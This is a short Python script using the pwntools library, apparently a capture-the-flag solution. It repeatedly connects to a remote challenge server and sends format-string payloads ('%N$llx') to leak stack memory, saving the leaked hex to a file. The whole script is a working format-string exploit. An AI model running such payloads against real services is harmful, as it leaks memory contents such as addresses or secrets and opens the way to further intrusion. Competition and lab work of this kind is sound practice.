from pwn import *

host = "host1.metaproblems.com"
port = 5470

hexes = ""

"""dumb solution, but ok"""

for i in range(1, 50):
	s = remote(host, port)

	payload = "%" + str(i) + "$llx"

	print(s.recvline().decode())
	print(payload)
	s.sendline(payload)
	result = s.recvline().decode()
	print(result)

	hexes += result[23:].lstrip()


	s.close()

print(hexes)

clueFile = open('clue', 'w')
clueFile.write(hexes)
clueFile.close()

